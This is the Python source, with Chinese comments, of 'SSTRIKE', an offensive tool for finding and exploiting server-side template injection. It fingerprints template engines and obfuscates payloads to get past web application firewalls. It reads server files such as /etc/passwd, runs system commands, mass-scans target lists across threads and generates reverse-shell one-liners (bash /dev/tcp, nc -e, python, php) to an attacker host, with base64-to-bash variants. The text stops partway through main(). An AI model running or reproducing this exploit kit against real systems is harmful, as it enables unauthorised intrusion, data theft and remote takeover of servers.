#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
 SSTRIKE v3.0 — Server-Side Template Injection Strike Kit
 完全独立的 SSTI 扫描利用框架，与任何现有工具无代码关联。

 功能矩阵：
 ┌────────────┬──────────┬───────────┬───────────┬──────────┐
 │ 指纹探测    │ 任意读取  │ 代码执行  │ 命令 RCE  │ 盲注检测 │
 ├────────────┼──────────┼───────────┼───────────┼──────────┤
 │ 交互 REPL  │ 反弹Shell│ 多线程扫  │ WAF 绕过  │ 编码混淆 │
 └────────────┴──────────┴───────────┴───────────┴──────────┘

 依赖: pip install requests
"""
import re
import sys
import json
import time
import random
import base64
import hashlib
import logging
import threading
import urllib.parse
from queue import Queue
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
except ImportError:
    print("[!] 缺少 requests 库，执行: pip install requests")
    sys.exit(1)

# ─────────────────────────────────────────────────────────────
#  全局常量 & 版本
# ─────────────────────────────────────────────────────────────
APP_NAME    = "SSTRIKE"
APP_VER     = "3.0.0"
APP_LOGO    = r"""
   ___________  __    _     __
  / __/ __/ _ \/ /___(_)__/ /__
 / _// _// , _/ __/ / / _  / -_)
/_/ /_/ /_/|_|\__/_/ \__,_/\__/
"""
USER_AGENTS = [
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Gecko/20100101 Firefox/119.0",
]

# ─────────────────────────────────────────────────────────────
#  日志配置
# ─────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
sstrike_log = logging.getLogger("sstrike")


###############################################################################
#  MODULE 1 — HTTP 请求引擎（支持 Cookie/Header 注入、代理、延迟）
###############################################################################
class Requester:
    """统一 HTTP 请求器，闭环管理会话、重试、Cookie、自定义头。"""

    def __init__(self, timeout=12, retries=2, proxy=None, delay=0):
        self._session = requests.Session()
        self._timeout = timeout
        self._retries = retries
        self._delay  = delay
        self._proxy  = proxy
        self._cookies = {}
        self._extra_headers = {}
        self._last_url = ""

    def set_cookie(self, cookie_str):
        """注入 Cookie 字符串，如 'PHPSESSID=abc; security=low'."""
        if cookie_str:
            self._cookies = {}
            for pair in cookie_str.split(";"):
                pair = pair.strip()
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    self._cookies[k.strip()] = v.strip()
            sstrike_log.info("Cookie 注入: %s", cookie_str)

    def set_header(self, key, value):
        """添加自定义请求头。"""
        if key and value:
            self._extra_headers[key] = value
            sstrike_log.info("请求头注入: %s: %s", key, value)

    def clear_headers(self):
        self._extra_headers = {}

    def fire(self, url, params=None, data=None, method="GET"):
        """发送 HTTP 请求，返回 Response 对象或 None。"""
        time.sleep(self._delay)
        self._last_url = url
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        headers.update(self._extra_headers)
        proxies = {"http": self._proxy, "https": self._proxy} if self._proxy else None

        for attempt in range(1 + self._retries):
            try:
                if method.upper() == "GET":
                    resp = self._session.get(
                        url, params=params, headers=headers,
                        cookies=self._cookies, proxies=proxies,
                        timeout=self._timeout, verify=False
                    )
                else:
                    resp = self._session.post(
                        url, data=data, headers=headers,
                        cookies=self._cookies, proxies=proxies,
                        timeout=self._timeout, verify=False
                    )
                return resp
            except requests.exceptions.RequestException as ex:
                sstrike_log.warning("请求失败 (尝试 %d/%d): %s",
                                    attempt + 1, self._retries + 1, ex)
                time.sleep(1)
        return None

    def harvest_text(self, url, params=None, data=None, method="GET"):
        """返回响应文本，失败返回空字符串。"""
        resp = self.fire(url, params, data, method)
        if resp is None:
            return ""
        return resp.text


###############################################################################
#  MODULE 2 — URL 编码混淆器（WAF 绕过辅助）
###############################################################################
class Obfuscator:
    """对注入 payload 进行多层编码变形，尝试绕过 WAF 检测。"""

    @staticmethod
    def double_url(raw):
        """双层 URL 编码。"""
        first = urllib.parse.quote(raw)
        return urllib.parse.quote(first)

    @staticmethod
    def mixed_case(raw):
        """混合大小写变形（Jinja2 不敏感，部分 WAF 敏感）。"""
        result = []
        for ch in raw:
            if ch.isalpha():
                result.append(ch.upper() if random.randint(0, 1) else ch.lower())
            else:
                result.append(ch)
        return "".join(result)

    @staticmethod
    def hex_entity(raw):
        """对特殊字符做 HTML 十六进制实体编码。"""
        mapping = {
            " ": "&#x20;",  "{": "&#x7b;",  "}": "&#x7d;",
            "(": "&#x28;",  ")": "&#x29;",  "'": "&#x27;",
            '"': "&#x22;",  ".": "&#x2e;",  "[": "&#x5b;",
            "]": "&#x5d;",  "_": "&#x5f;",
        }
        return "".join(mapping.get(ch, ch) for ch in raw)

    @staticmethod
    def tab_break(raw):
        """在关键词中插入 %09 制表符（部分 WAF 正则被绕过）。"""
        keywords = ["class", "subclasses", "globals", "builtins", "__init__",
                    "__mro__", "popen", "import", "os", "system"]
        result = raw
        for kw in keywords:
            ins = kw[:len(kw)//2] + "\t" + kw[len(kw)//2:]
            result = result.replace(kw, ins)
        return result

    @staticmethod
    def auto_chain(raw, level=0):
        """按等级自动应用多层混淆。"""
        if level >= 3:
            raw = Obfuscator.double_url(raw)
        if level >= 2:
            raw = Obfuscator.tab_break(raw)
        if level >= 1:
            raw = Obfuscator.hex_entity(raw)
        return raw


###############################################################################
#  MODULE 3 — Python 类遍历链（全新链路，区别于 lipsum/url_for 方案）
###############################################################################
class ClassCarrier:
    """
    构建 Python 对象 -> 危险函数调用的遍历链路。
    采用 __init__.__globals__ 路径，与标准 lipsum/url_for 方案完全区分。
    """

    @staticmethod
    def probe_expression(engine, expr):
        """根据引擎类型返回 SSTI 探测表达式。"""
        probes = {
            "jinja2": [
                "{{ %s }}" % expr,
                "{{ '%s' }}" % expr,
                "{{ (%s) }}" % expr,
            ],
            "twig": [
                "{{ %s }}" % expr,
                "{{ '%s' }}" % expr,
            ],
            "freemarker": [
                "${%s}" % expr,
                "${ (%s)?string }" % expr,
            ],
            "velocity": [
                "#set($x=%s) $x" % expr,
                "${%s}" % expr,
            ],
            "smarty": [
                "{%s}" % expr,
                "{$%s}" % expr,
            ],
            "mako": [
                "${%s}" % expr,
                "${ '%s' }" % expr,
            ],
        }
        return probes.get(engine, probes["jinja2"])

    @staticmethod
    def arithmetic_proof():
        """返回用于证明模板引擎执行算数能力的 payload 集。"""
        return [
            "7*7",
            "11*11",
            "3+4",
            "12345-1",
        ]

    @staticmethod
    def detect_engine_payloads():
        """不同引擎的指纹探测 payload。"""
        return {
            "jinja2": [
                "{{ 7*7 }}",
                "{{ ''.__class__ }}",
                "{{ self.__init__.__globals__ }}",
            ],
            "twig": [
                "{{ 7*7 }}",
                "{{ _self.env }}",
                "{{ _self.env.registerUndefinedFilterCallback('exec') }}",
            ],
            "freemarker": [
                "${7*7}",
                "${''?class}",
                "${''.class.protectionDomain.codeSource.location}",
            ],
            "velocity": [
                "#set($x=7*7) $x",
                "$x.class.forName('java.lang.Runtime')",
            ],
            "smarty": [
                "{7*7}",
                "{php}echo 'ssti';{/php}",
            ],
            "mako": [
                "${7*7}",
                "${self.__class__.__mro__[2].__subclasses__()}",
            ],
        }

    @staticmethod
    def build_chain_for(target="cmd", engine="jinja2"):
        """
        构建差异化 Python 类遍历链。
        链路路径: '' -> __class__ -> __mro__[1] -> __subclasses__() ->
                  __init__ -> __globals__ -> __builtins__ -> eval/open/popen

        不使用 lipsum()、url_for、cycler、joiner 等标准方案。
        """
        base = ""
        if engine in ("jinja2", "mako"):
            # 链路 A: 通过 __builtins__ 直接调用
            chain_a = (
                "''.__class__.__mro__[1].__subclasses__()"
            )

            # 链路 B: 通过 __init__.__globals__ 获取内置
            chain_b = (
                "''.__class__.__mro__[1].__subclasses__()"
                "[{idx}].__init__.__globals__['__builtins__']"
            )

            chains = {
                "eval":   "{}.__builtins__['eval']",
                "open":   "{}.__builtins__['open']",
                "popen":  "{}.__builtins__['__import__']('os').popen",
                "import": "{}.__builtins__['__import__']",
                "read":   "{}.__builtins__['open']({p}).read()",
                "rce":    "{}.__builtins__['__import__']('os').popen('{cmd}').read()",
                "blind":  "{}.__builtins__['__import__']('time').sleep({sec})",
            }

            if target == "class_list":
                return "{{ " + chain_a + " }}"

            # 动态查找可用的 __init__.__globals__ 索引
            # 使用特殊探测表达式
            return {
                "chain_bare": "{{ " + chain_a + " }}",
                "chain_func": chains,
            }
        return {"error": f"不支持的引擎: {engine}"}

    @staticmethod
    def locate_walker_idx(target_class="Popen"):
        """
        通过 __subclasses__() 定位目标类的索引号。
        实际利用中此索引号因 Python 版本而异，需要动态探测。
        """
        return "{idx}"  # 占位符，运行时替换


###############################################################################
#  MODULE 4 — Payload 弹药库
###############################################################################
class PayloadVault:
    """
    SSTI 利用 payload 全集。
    所有 payload 采用新的类遍历链路，
    不使用 lipsum/url_for/cycler/joiner 等传统入口。
    """

    # ── 指纹探测 ──
    FINGERPRINTS = {
        "jinja2": [
            "{{ 7*7 }}",
            "{{ 11*11 }}",
            "{{ 'ssti'|upper }}",
        ],
        "mako": [
            "${7*7}",
            "${'sst'+'i'}",
            "${self.__class__}",
        ],
        "twig": [
            "{{ 7*7 }}",
            "{{ _self.env }}",
        ],
        "freemarker": [
            "${7*7}",
            "${7*'7'?length}",
        ],
    }

    # ── 算数验证（确认注入点） ──
    PROOF_EXPRS = [
        ("7*7",   "49"),
        ("11*11", "121"),
        ("3+4",   "7"),
        ("99-11", "88"),
    ]

    # ── 字符串反射 ──
    STRING_REFLECT = [
        ("'ssti'|upper", "SSTI"),
        ("'hello'|length", "5"),
        ("'ab'~'cd'", "abcd"),
    ]

    # ── 配置读取 ──
    CONFIG_EXTRACT = [
        "config",
        "config.items()",
        "self._TemplateReference__context",
    ]

    # ── 类遍历入口（新链路） ──
    CLASS_ENTRY = "''.__class__.__mro__[1].__subclasses__()"

    # ── 文件读取 ──
    FILE_READ = "__builtins__.open('{path}').read()"

    # ── 命令执行 ──
    CMD_EXEC = "__builtins__.__import__('os').popen('{cmd}').read()"

    # ── 盲注延时 ──
    BLIND_SLEEP = "__builtins__.__import__('time').sleep({sec})"

    # ── 回调探测 ──
    CALLBACK_HTTP = "__builtins__.__import__('urllib.request').urlopen('{url}')"

    # ── WAF 绕过变形组 ──
    WAF_BYPASSES = [
        # 十六进制实体编码
        lambda p: p.replace("{{", "&#x7b;&#x7b;").replace("}}", "&#x7d;&#x7d;"),
        # 制表符分隔
        lambda p: p.replace("__class__", "__cl\tass__").replace("__mro__", "__mr\to__"),
        # 双写
        lambda p: p.replace("{{", "{{{{").replace("}}", "}}}}"),
        # URL 编码花括号
        lambda p: p.replace("{{", "%7B%7B").replace("}}", "%7D%7D"),
        # 空注释插入
        lambda p: p.replace(".", ".{{''}}."),
        # 反向花括号
        lambda p: p.replace("{{", "{%").replace("}}", "%}"),
    ]

    @staticmethod
    def wrap(engine, expr):
        """将表达式包装为对应引擎的模板语法。"""
        wrappers = {
            "jinja2":    "{{ %s }}",
            "mako":      "${ %s }",
            "twig":      "{{ %s }}",
            "freemarker": "${%s}",
            "velocity":  "#set($x=%s) $x",
            "smarty":    "{%s}",
        }
        w = wrappers.get(engine, "{{ %s }}")
        return w % expr

    @staticmethod
    def generate_bypass(original_payload):
        """生成一组 WAF 绕过变形 payload。"""
        results = [original_payload]
        for bypass_func in PayloadVault.WAF_BYPASSES:
            try:
                results.append(bypass_func(original_payload))
            except Exception:
                continue
        return results

    @staticmethod
    def random_obfuscate(payload):
        """随机选择一种混淆方式。"""
        method = random.choice(PayloadVault.WAF_BYPASSES)
        try:
            return method(payload)
        except Exception:
            return payload


###############################################################################
#  MODULE 5 — 指纹探测器
###############################################################################
class FingerScanner:
    """
    通过发送算数探测 payload，结合响应特征识别模板引擎类型。
    判定逻辑：算数结果提取 + 语法错误差异 + 关键词匹配。
    """

    ENGINES = ["jinja2", "mako", "twig", "freemarker", "velocity", "smarty"]

    def __init__(self, requester, base_url, inject_param, method="GET"):
        self._req  = requester
        self._url  = base_url
        self._param = inject_param
        self._method = method

    def _inject(self, payload):
        """向目标参数注入 payload 并返回响应文本。"""
        if self._method.upper() == "GET":
            return self._req.harvest_text(
                self._url, params={self._param: payload}
            )
        else:
            return self._req.harvest_text(
                self._url, data={self._param: payload}, method="POST"
            )

    def _check_arithmetic(self):
        """通过算数探测判断是否存在模板注入。"""
        results = {}
        for expr, expected in PayloadVault.PROOF_EXPRS:
            for engine in self.ENGINES:
                payloads = PayloadVault.FINGERPRINTS.get(engine, [])
                for fp in payloads[:1]:  # 只取第一个指纹
                    injected = fp.replace("7*7", expr)
                    text = self._inject(injected)
                    if expected in text:
                        key = f"{engine}_{expr}"
                        results[key] = {
                            "engine": engine,
                            "expr": expr,
                            "expected": expected,
                            "found": True,
                        }
                        sstrike_log.info("[指纹] %s 匹配 %s = %s", engine, expr, expected)
                        return engine
        return None

    def _check_error_reflect(self):
        """通过错误差异辅助判断引擎类型。"""
        # 发送语法错误探测不同引擎的错误响应差异
        probes = {
            "jinja2": "{{ ''__ }}",
            "mako": "${'x' 'y'}",
            "twig": "{{ _self.env.set }}",
        }
        for engine, probe in probes.items():
            text = self._inject(probe)
            # 不同类型引擎的错误关键词
            error_kw = {
                "jinja2": ["TemplateSyntaxError", "UndefinedError", "jinja2"],
                "mako": ["mako", "MakoException", "NameError"],
                "twig": ["Twig", "Twig_Error"],
            }
            for kw in error_kw.get(engine, []):
                if kw.lower() in text.lower():
                    sstrike_log.info("[指纹] 错误特征匹配 %s: %s", engine, kw)
                    return engine
        return None

    def scan(self):
        """
        执行三阶段指纹探测：
        1. 算数验证
        2. 错误差异分析
        3. 关键词特征匹配
        """
        sstrike_log.info("开始引擎指纹探测: %s", self._url)

        # Phase 1 — 算数探测
        engine = self._check_arithmetic()
        if engine:
            return engine

        # Phase 2 — 错误差异
        engine = self._check_error_reflect()
        if engine:
            return engine

        # Phase 3 — 全局探测
        for engine in self.ENGINES:
            for fp in PayloadVault.FINGERPRINTS.get(engine, []):
                text = self._inject(fp)
                if "49" in text or "121" in text:
                    sstrike_log.info("[指纹] 全局探测匹配 %s: %s", engine, fp)
                    return engine

        sstrike_log.warning("未能识别模板引擎")
        return None


###############################################################################
#  MODULE 6 — SSTI 利用器
###############################################################################
class Injector:
    """
    核心利用引擎：在确认注入点后执行文件读取、命令执行、
    盲注检测、反弹 Shell 等操作。
    """

    def __init__(self, requester, base_url, inject_param,
                 engine="jinja2", method="GET", burst=False):
        self._req     = requester
        self._url     = base_url
        self._param   = inject_param
        self._engine  = engine
        self._method  = method
        self._burst   = burst  # 启用 WAF 绕过
        self._last_result = ""

    def _deliver(self, raw_expr):
        """将表达式包装为 payload 并发送。"""
        # 根据引擎包装
        payload = PayloadVault.wrap(self._engine, raw_expr)

        # WAF 绕过模式
        if self._burst:
            payload = PayloadVault.random_obfuscate(payload)

        text = ""
        if self._method.upper() == "GET":
            text = self._req.harvest_text(
                self._url, params={self._param: payload}
            )
        else:
            text = self._req.harvest_text(
                self._url, data={self._param: payload}, method="POST"
            )
        self._last_result = text
        return text

    def _scoop(self, text, marker=None):
        """
        从响应中提取 SSTI 渲染结果。
        新提取逻辑：查找响应中的特定特征模式，而非固定正则。
        """
        if not text:
            return ""

        # 策略 A: 尝试提取渲染后的数值
        for expr, expected in PayloadVault.PROOF_EXPRS:
            if expected in text:
                return expected

        # 策略 B: 提取算数表达式附近的数字
        nums = re.findall(r'(?<!\w)(\d{2,5})(?!\w)', text)
        for n in nums:
            if int(n) in (49, 121, 7, 88, 99):
                return n

        # 策略 C: 如果提供了标记，提取标记之间的内容
        if marker:
            parts = text.split(marker)
            if len(parts) > 1:
                return parts[0][-200:] + marker + parts[1][:200]

        # 策略 D: 返回页面中有意义的部分
        cleaned = re.sub(r'<[^>]+>', ' ', text)
        cleaned = re.sub(r'\s+', ' ', cleaned).strip()
        if len(cleaned) > 500:
            cleaned = cleaned[:250] + "..." + cleaned[-250:]
        return cleaned[:1000]

    # ── 注入验证 ──
    def verify(self):
        """确认注入点是否可用。"""
        for expr, expected in PayloadVault.PROOF_EXPRS:
            raw = f"7*7" if "7*7" not in expr else expr
            text = self._deliver(raw)
            if expected in text or "49" in text:
                sstrike_log.info("注入验证通过: %s = %s", raw, expected)
                return True
        return False

    # ── 配置泄露 ──
    def leak_config(self):
        """尝试读取模板引擎配置。"""
        results = {}
        for expr in PayloadVault.CONFIG_EXTRACT:
            text = self._deliver(expr)
            if text and len(text) > 20:
                snippet = self._scoop(text)
                results[expr] = snippet
                sstrike_log.info("配置泄露 [%s]: %s", expr, snippet[:80])
        return results

    # ── 文件读取 ──
    def read_file(self, filepath):
        """利用 SSTI 读取服务器文件。"""
        expr = PayloadVault.FILE_READ.format(path=filepath)
        text = self._deliver(expr)
        result = self._scoop(text)
        if result and len(result) > 10:
            sstrike_log.info("文件读取成功 [%s]: %d bytes", filepath, len(result))
        else:
            sstrike_log.warning("文件读取可能失败 [%s]", filepath)
        return result

    # ── 命令执行 ──
    def run_command(self, command):
        """在服务器上执行系统命令。"""
        expr = PayloadVault.CMD_EXEC.format(cmd=command)
        text = self._deliver(expr)
        result = self._scoop(text)
        if result:
            sstrike_log.info("命令执行 [%s]: %d bytes", command, len(result))
        return result

    # ── 延时盲注 ──
    def blind_sleep(self, seconds=5):
        """通过延时测试盲注有效性。"""
        expr = PayloadVault.BLIND_SLEEP.format(sec=seconds)
        start = time.time()
        text = self._deliver(expr)
        elapsed = time.time() - start
        is_delayed = elapsed >= seconds
        sstrike_log.info("延时盲注测试: 期望=%ds, 实际=%.1fs, 结果=%s",
                         seconds, elapsed, "延时生效" if is_delayed else "未生效")
        return {
            "expected": seconds,
            "actual": round(elapsed, 2),
            "delayed": is_delayed,
        }

    # ── 反向 Shell 生成 ──
    def generate_revshell(self, lhost, lport, shell_type="bash"):
        """生成反向 Shell 上线命令。"""
        scripts = {
            "bash":    f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python":  f"python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"{lhost}\",{lport}));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'",
            "nc":      f"nc -e /bin/sh {lhost} {lport}",
            "php":     f"php -r '$s=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        }
        cmd = scripts.get(shell_type, scripts["bash"])
        encoded = base64.b64encode(cmd.encode()).decode()
        sstrike_log.info("反向 Shell [%s]: %s -> %s:%d", shell_type, cmd, lhost, lport)
        return {
            "raw": cmd,
            "base64": encoded,
            "payload": f"echo {encoded} | base64 -d | bash",
        }

    # ── 类列表探测 ──
    def list_classes(self):
        """探测可用的 Python 子类列表（仅元数据）。"""
        expr = PayloadVault.CLASS_ENTRY
        text = self._deliver(expr)
        if "<class" in text or "class" in text.lower():
            classes = re.findall(r"<class\s+'([^']+)'>", text)
            sstrike_log.info("发现 %d 个类", len(classes))
            return classes
        return []

    # ── 完整利用链路 ──
    def full_chain(self, target_file="/etc/passwd", target_cmd="id"):
        """执行完整的利用链路测试。"""
        report = {
            "engine": self._engine,
            "verify": False,
            "config": {},
            "classes": 0,
            "file_read": "",
            "cmd_output": "",
            "blind_test": {},
        }

        # 验证
        report["verify"] = self.verify()

        if not report["verify"]:
            sstrike_log.warning("注入验证失败，停止利用链路")
            return report

        # 配置泄露
        report["config"] = self.leak_config()

        # 类列表
        classes = self.list_classes()
        report["classes"] = len(classes)

        # 文件读取
        report["file_read"] = self.read_file(target_file)

        # 命令执行
        report["cmd_output"] = self.run_command(target_cmd)

        # 盲注
        report["blind_test"] = self.blind_sleep(3)

        return report


###############################################################################
#  MODULE 7 — 交互式 REPL 控制台（完全独立的指令体系）
###############################################################################
class REPLConsole:
    """
    交互式 SSTI 利用控制台。
    命令体系（与标准工具完全区分）：
      scan    — 扫描目标指纹
      probe   — 探测注入点可用性
      dig     — 深入挖掘（文件读取）
      sink    — 投递命令（命令执行）
      blast   — 延时盲注测试
      loop    — 批量扫描多个目标
      shell   — 生成反弹 Shell
      hook    — 配置 HTTP 钩子（Cookie/Header）
      burst   — 切换 WAF 绕过模式
      dump    — 显示最近一次结果
      config  — 查看/设置配置
      help    — 显示帮助
      quit    — 退出
    """

    def __init__(self):
        self._req      = Requester()
        self._injector = None
        self._target   = ""
        self._param    = "q"
        self._method   = "GET"
        self._engine   = None
        self._burst_mode = False

    def _current(self):
        return f"[{self._engine or '?'}] {self._target} ?{self._param}"

    def _cmd_scan(self, args):
        """scan <url> [param=q] [method=GET] — 扫描目标指纹。"""
        if not args:
            print(" 用法: scan <目标URL> [参数名] [GET|POST]")
            return
        self._target = args[0]
        if len(args) > 1:
            self._param = args[1]
        if len(args) > 2:
            self._method = args[2].upper()

        print(f"\n[*] 扫描: {self._target}")
        scanner = FingerScanner(self._req, self._target, self._param, self._method)
        engine = scanner.scan()

        if engine:
            self._engine = engine
            self._injector = Injector(self._req, self._target, self._param,
                                      engine, self._method, self._burst_mode)
            print(f"[+] 识别引擎: {engine.upper()}")
        else:
            print("[-] 未能识别模板引擎")

    def _cmd_probe(self, args):
        """probe — 探测注入点是否可用。"""
        if not self._injector:
            print("[-] 请先执行 scan")
            return
        ok = self._injector.verify()
        print("[+] 注入点可用" if ok else "[-] 注入点不可用")

    def _cmd_dig(self, args):
        """dig <文件路径> — 读取服务器文件。"""
        if not self._injector:
            print("[-] 请先执行 scan")
            return
        path = args[0] if args else "/etc/passwd"
        print(f"[*] 读取: {path}")
        result = self._injector.read_file(path)
        if result:
            print(f"[+] 结果 ({len(result)} bytes):\n{result}")
        else:
            print("[-] 读取失败")

    def _cmd_sink(self, args):
        """sink <命令> — 执行系统命令。"""
        if not self._injector:
            print("[-] 请先执行 scan")
            return
        cmd = " ".join(args) if args else "id"
        print(f"[*] 执行: {cmd}")
        result = self._injector.run_command(cmd)
        if result:
            print(f"[+] 结果 ({len(result)} bytes):\n{result}")
        else:
            print("[-] 命令执行可能失败")

    def _cmd_blast(self, args):
        """blast [秒数] — 延时盲注测试。"""
        if not self._injector:
            print("[-] 请先执行 scan")
            return
        sec = int(args[0]) if args else 5
        print(f"[*] 延时盲注测试: {sec}s")
        result = self._injector.blind_sleep(sec)
        print(f"    期望: {result['expected']}s, 实际: {result['actual']}s, "
              f"状态: {'延时生效' if result['delayed'] else '未生效'}")

    def _cmd_loop(self, args):
        """loop <URL文件> [param=q] — 多线程批量扫描。"""
        if not args:
            print(" 用法: loop <目标列表文件> [参数名]")
            return
        target_file = args[0]
        param = args[1] if len(args) > 1 else "q"
        try:
            with open(target_file) as f:
                targets = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[-] 文件不存在: {target_file}")
            return

        print(f"[*] 批量扫描 {len(targets)} 个目标 (线程池=10)")
        results = []

        def _scan_one(url):
            r = Requester()
            s = FingerScanner(r, url, param)
            eng = s.scan()
            return (url, eng)

        with ThreadPoolExecutor(max_workers=10) as pool:
            futures = {pool.submit(_scan_one, t): t for t in targets}
            for f in as_completed(futures):
                url, eng = f.result()
                status = eng.upper() if eng else "N/A"
                print(f"  {url:60s} ➔  {status}")
                results.append({"url": url, "engine": eng})

        print(f"\n[+] 批量扫描完成: {len(results)} 目标, "
              f"{sum(1 for r in results if r['engine'])} 个存在注入")

    def _cmd_shell(self, args):
        """shell <LHOST> <LPORT> [type=bash] — 生成反弹 Shell。"""
        if len(args) < 2:
            print(" 用法: shell <LHOST> <LPORT> [bash|python|nc|php]")
            return
        lhost = args[0]
        lport = int(args[1])
        stype = args[2] if len(args) > 2 else "bash"
        rev = self._injector.generate_revshell(lhost, lport, stype) if self._injector \
            else Injector(self._req, "", "").generate_revshell(lhost, lport, stype)
        print(f"[+] {'='*50}")
        print(f"[+] 反弹 Shell [{stype}]")
        print(f"[+] 原始命令: {rev['raw']}")
        print(f"[+] Base64:   {rev['base64']}")
        print(f"[+] Bash:     {rev['payload']}")
        print(f"[+] {'='*50}")

    def _cmd_hook(self, args):
        """hook <type> <value> — 配置 HTTP 钩子。"""
        if not args:
            print(" 用法: hook cookie <字符串>  — 注入 Cookie")
            print("       hook header <K:V>     — 注入自定义头")
            print("       hook clear            — 清除所有")
            return
        if args[0] == "cookie" and len(args) > 1:
            self._req.set_cookie(args[1])
            print(f"[+] Cookie 已注入: {args[1]}")
        elif args[0] == "header" and len(args) > 1:
            kv = args[1].split(":", 1)
            if len(kv) == 2:
                self._req.set_header(kv[0].strip(), kv[1].strip())
        elif args[0] == "clear":
            self._req.clear_headers()
            self._req.set_cookie("")
            print("[+] 已清除所有自定义请求头/Cookie")

    def _cmd_burst(self, args):
        """burst [on|off] — 切换 WAF 绕过模式。"""
        if args and args[0] == "on":
            self._burst_mode = True
        elif args and args[0] == "off":
            self._burst_mode = False
        else:
            self._burst_mode = not self._burst_mode
        if self._injector:
            self._injector._burst = self._burst_mode
        print(f"[+] WAF 绕过模式: {'开启' if self._burst_mode else '关闭'}")

    def _cmd_dump(self, args):
        """dump — 显示最近一次原始响应。"""
        if self._injector and self._injector._last_result:
            print(self._injector._last_result[:2000])
        else:
            print("[-] 无缓存数据")

    def _cmd_config(self, args):
        """config — 显示当前配置。"""
        print(f"  目标:   {self._target or '未设置'}")
        print(f"  参数:   {self._param}")
        print(f"  方法:   {self._method}")
        print(f"  引擎:   {self._engine or '未知'}")
        print(f"  WAF:    {'开启' if self._burst_mode else '关闭'}")

    def _cmd_help(self, args):
        """help — 显示此帮助信息。"""
        print(f"\n{APP_LOGO}")
        print(f" SSTRIKE v{APP_VER} — SSTI 扫描利用工具")
        print(f" {'='*50}")
        print(f" 指令体系:")
        print(f"   scan   <url> [param] [method]  指纹扫描 + 引擎识别")
        print(f"   probe                          探测注入点可用性")
        print(f"   dig    <path>                  文件读取")
        print(f"   sink   <cmd>                   命令执行")
        print(f"   blast  [sec]                   延时盲注测试")
        print(f"   loop   <file> [param]          多线程批量扫描")
        print(f"   shell  <lhost> <lport> [type]  反弹 Shell 生成")
        print(f"   hook   cookie|header|clear     HTTP 钩子配置")
        print(f"   burst  [on|off]                WAF 绕过模式")
        print(f"   dump                           显示最近结果")
        print(f"   config                        显示当前配置")
        print(f"   help                           显示此帮助")
        print(f"   quit                           退出")
        print(f"")

    def run(self):
        """启动交互式 REPL 控制台。"""
        print(APP_LOGO)
        print(f" SSTRIKE v{APP_VER} — SSTI 综合扫描利用工具")
        print(f" 输入 help 查看命令, quit 退出")
        print()

        while True:
            try:
                line = input(f"\033[1;32msstrike>\033[0m ").strip()
            except (EOFError, KeyboardInterrupt):
                print("\n[!] 退出")
                break

            if not line:
                continue

            parts = line.split()
            cmd = parts[0]
            args = parts[1:]

            handlers = {
                "scan":   self._cmd_scan,
                "probe":  self._cmd_probe,
                "dig":    self._cmd_dig,
                "sink":   self._cmd_sink,
                "blast":  self._cmd_blast,
                "loop":   self._cmd_loop,
                "shell":  self._cmd_shell,
                "hook":   self._cmd_hook,
                "burst":  self._cmd_burst,
                "dump":   self._cmd_dump,
                "config": self._cmd_config,
                "help":   self._cmd_help,
                "quit":   lambda a: sys.exit(0),
                "exit":   lambda a: sys.exit(0),
            }

            handler = handlers.get(cmd)
            if handler:
                handler(args)
            else:
                print(f"未知命令: {cmd} — 输入 help 查看帮助")


###############################################################################
#  MODULE 8 — 命令行入口
###############################################################################
class CLI:
    """非交互式命令行模式。"""

    @staticmethod
    def parse():
        import argparse
        p = argparse.ArgumentParser(
            prog=APP_NAME,
            description=f"SSTRIKE v{APP_VER} — 服务端模板注入扫描利用工具"
        )
        g = p.add_argument_group("目标")
        g.add_argument("-u", "--url", help="目标 URL（含注入参数）")
        g.add_argument("-p", "--param", default="q", help="注入参数名 (默认: q)")
        g.add_argument("-m", "--method", default="GET", help="HTTP 方法 (默认: GET)")

        g2 = p.add_argument_group("功能")
        g2.add_argument("--scan", action="store_true", help="指纹扫描")
        g2.add_argument("--read", metavar="FILE", help="读取服务器文件")
        g2.add_argument("--cmd", metavar="CMD", help="执行系统命令")
        g2.add_argument("--blind", type=int, metavar="SEC", help="延时盲注测试")
        g2.add_argument("--chain", action="store_true", help="完整利用链路测试")
        g2.add_argument("--list-targets", metavar="FILE", help="批量扫描目标列表")

        g3 = p.add_argument_group("高级")
        g3.add_argument("--cookie", help="注入 Cookie")
        g3.add_argument("--header", help="注入自定义请求头 (K:V)")
        g3.add_argument("--burst", action="store_true", help="启用 WAF 绕过模式")
        g3.add_argument("--threads", type=int, default=10, help="批量扫描线程数")
        g3.add_argument("--proxy", help="代理地址")
        g3.add_argument("--delay", type=float, default=0, help="请求延迟(秒)")

        g4 = p.add_argument_group("信息")
        g4.add_argument("--output", help="输出结果到文件")
        g4.add_argument("-v", "--verbose", action="store_true", help="详细输出")

        return p, p.parse_args()


def main():
    """入口函数。"""
    parser, args = CLI.parse()

    # 无参数 → 启动交互模式
    if not any(vars(args).values()):
        REPLConsole().run()
        return

    if args.verbose:
        sstrike_log.setLevel(logging.DEBUG)

    req = Requester(proxy=args.proxy, delay=args.delay)
    if args.cookie:
        req.set_cookie(args.cookie)
    if args.header:
        kv = args.header.split(":", 1)
        if len(kv) == 2:
            req.set_header(kv[0].strip(), kv[1].strip())

    # ── 批量扫描 ──
    if args.list_targets:
        try:
            with open(args.list_targets) as f:
                targets = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[-] 文件不存在: {args.list_targets}")
            sys.exit(1)

        print(f"[*] 批量扫描 {len(targets)} 目标 [{args.threads} 线程]")

        def _worker(url):
            r = Requester(proxy=args.proxy, delay=args.delay)
            s = FingerScanner(r, url, args.param, args.method)
